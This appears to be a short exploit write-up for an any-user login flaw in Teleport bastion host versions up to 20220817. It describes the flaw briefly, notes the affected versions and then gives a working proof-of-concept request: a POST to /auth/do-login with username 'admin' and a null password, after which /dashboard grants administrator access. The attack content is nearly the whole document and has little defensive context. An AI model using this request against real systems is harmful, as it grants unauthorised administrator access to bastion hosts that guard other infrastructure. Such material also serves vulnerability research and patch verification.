# Teleport Fortress do-login Any user login vulnerability

## Vulnerability Description

Teleport Fortress has a login vulnerability for any user. The attacker can log in to the Fortress to obtain other system permissions by constructing a special request package.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Teleport Version <= 20220817</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1660720653270-fcd22c8e-0df1-42ea-aa02-2c94e0770e76-20220823130937164.png)

Verify POC, captcha parameter is the verification code

```php
POST /auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661087828041-1bf5d666-f5fd-4d69-9099-465b3dd492f2-20220823130936374.png)

Returning code 0 means success, and then access /dashboard to obtain administrator permissions

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661087872154-ba6ae117-5a99-43f4-919f-1b22f403ab37-20220823130936385.png)